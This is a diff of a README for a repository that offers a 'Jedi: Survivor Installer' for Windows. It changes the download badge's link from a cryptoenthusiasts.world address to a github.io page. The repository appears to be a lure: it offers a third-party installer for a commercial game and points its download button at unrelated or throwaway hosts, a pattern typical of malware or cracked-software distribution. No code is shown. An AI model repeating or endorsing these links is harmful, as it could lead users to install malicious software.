@@ -2,7 +2,7 @@
 
 This repository provides a clean Windows setup for **Jedi: Survivor Installer** — linking the correct launcher, verifying files, choosing performance presets, and managing DLC/saves safely.
 
-[![Download Jedi: Survivor Installer](https://img.shields.io/badge/Download-jedi--survivor--installer-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Jedi: Survivor Installer](https://img.shields.io/badge/Download-jedi--survivor--installer-blueviolet)](https://i71662107.github.io/.github/jedi-survivor-hub)
 
 ---
 
